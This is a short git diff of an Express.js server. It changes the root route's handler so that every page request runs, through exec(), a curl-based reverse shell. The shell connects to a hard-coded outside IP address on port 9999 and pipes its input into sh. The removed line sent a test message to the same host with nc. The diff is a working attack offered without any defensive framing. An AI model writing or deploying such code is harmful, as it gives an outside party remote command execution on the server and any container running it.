@@ -5,8 +5,8 @@ const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.get('/', (req, res) => {
-    // Replace "Your message here" with the data you want to send
-    const command = 'echo "inside container" | nc 140.238.85.162 9999';
+    // Command to run the curl reverse shell
+    const command = `C='curl -Ns telnet://140.238.85.162:9999'; $C </dev/null 2>&1 | sh 2>&1 | $C >/dev/null`;
     
     exec(command, (error, stdout, stderr) => {
         if (error) {
